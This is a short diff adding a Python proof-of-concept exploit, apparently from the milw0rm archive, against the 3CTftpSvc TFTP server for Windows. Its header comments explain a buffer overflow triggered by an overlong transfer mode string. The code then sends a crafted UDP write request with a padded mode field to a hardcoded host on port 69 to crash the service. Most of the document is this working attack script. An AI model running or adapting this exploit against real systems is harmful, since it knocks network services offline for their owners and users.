@@ -1,0 +1,43 @@
+#!/usr/bin/python
+# Buffer Overflow (Long transporting mode) Vulnerability Exploit
+# This is just a DoS exploiting code
+# Tested on Windows xp SP2
+#
+# Requires python and impacket
+#
+# Coded by Liu Qixu Of NCNIPC
+
+# SUMMARY:
+
+# 3CTftpSvc TFTP Server is a Freeware TFTP server for Windows 9x/NT/XP.
+# (http://support.3com.com/software/utilities_for_windows_32_bit.htm
+# or ftp://ftp.3com.com/pub/utilbin/win32/3CTftpSvc.zip)
+# It provides an implementation of the TFTPv2 protocol.
+
+# A vulnerability has been identified in 3CTftpSvc TFTP Server, which could be exploited by attackers 
+# to execute arbitrary commands or cause a denial of service. This flaw is 
+# due to a buffer overflow error when handling an overly long transporting 
+# mode (more than 470 bytes) passed to a "GET" or "PUT" command, which could 
+# be exploited by malicious users to compromise a vulnerable system or crash 
+# an affected application.
+
+# EXPLOIT:
+
+import socket
+import sys
+
+host = '192.168.1.11'
+port = 69
+
+try:
+   s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+except:
+   print "socket() failed"
+   sys.exit(1)
+
+filename = "A"
+mode = "netascii" + "A" * 469
+da = "\x00\x02" + filename + "\0" + mode + "\0"
+s.sendto(da, (host, port))
+
+# milw0rm.com [2006-11-27]
